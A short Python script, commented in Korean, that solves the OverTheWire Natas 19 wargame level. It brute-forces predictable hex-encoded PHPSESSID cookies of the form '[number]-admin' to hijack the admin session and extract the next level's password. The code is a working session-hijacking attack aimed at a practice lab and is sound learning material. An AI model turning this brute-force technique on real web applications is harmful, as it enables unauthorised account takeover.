import requests
import re

url = "http://natas19.natas.labs.overthewire.org/"
#natas19 비밀번호 아래 변수에 대입하여 사용 
natas19_cred = ""

s = requests.Session()
s.auth = ("natas19", natas19_cred)

# 아전 단계와 같이 쿠키값 생성 최대 숫자 범위 640으로 설정
MAX_VAL = 640
boundary = "=" * 60
username = "admin"   # 일단 admin으로 먼저 테스트

# 쿠키값 포멧이 [숫자]-[username]이므로 아래와 같이 숫자를 바꿔가면서 부르트포스 사용
for i in range(1, MAX_VAL + 1):
  payload = f"{i}-{username}".encode("utf-8").hex()
  cookies = {"PHPSESSID": payload} 
  
  response = s.get(url, cookies=cookies, timeout=3)
  password = ""
  
  #전 코드에서 보고 Password 조건을 해도 되지만, 아닐 때 나오는 응답을 통해 admin의 진짜 쿠키 출력   
  if "You are logged in as a regular user" not in response.text:
    print(boundary)
    print(f"[+]admin 세션 평문 ===> {i}-{username}")
    print(f"[+]진짜 admin의 쿠키값에 해당하는 세션 데이터 ===> {payload}")
    print(boundary)
    
    # re 모듈로 비밀번호 문자열만 출력
    password = re.search(r"Password:\s*(\w+)", response.text) 
    
    if password:
      print(f"[+]나타스 20의 비밀번호 ===> {password.group(1)}")
      print(boundary)
    else:
      print("[-]아래 html 코드 전체를 확인해서 직접 비밀번호 확인 필요")  
      print(response.text)
      print(boundary)
    break

# 아예 찾지 못했을 때, 예외처리
else:
  print("[-]username이나 MAX_VAL이 다를 수 있어 재확인 필요")
